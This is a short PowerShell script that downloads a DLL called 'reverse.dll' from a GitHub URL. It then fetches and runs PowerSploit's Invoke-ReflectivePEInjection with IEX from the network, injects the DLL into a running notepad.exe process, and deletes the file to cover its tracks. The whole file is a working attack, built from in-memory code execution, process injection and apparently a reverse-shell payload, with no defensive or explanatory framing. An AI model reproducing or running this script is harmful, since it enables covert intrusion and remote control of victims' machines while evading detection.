# URL where the DLL is hosted
$dllUrl = "https://github.com/AlexTriumf/pst/raw/refs/heads/main/reverse.dll"

# Path to save the DLL temporarily
$dllPath = "$env:temp\reverse.dll"

# Download the DLL from the server
Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath

# Import PowerSploit's Invoke-ReflectivePEInjection function
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')

# Read the DLL bytes into a variable
$PEBytes = [IO.File]::ReadAllBytes($dllPath)

# Inject the DLL into notepad.exe
$process = Get-Process notepad
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcId $process.Id

# Optionally, remove the downloaded DLL file after injection
Remove-Item $dllPath
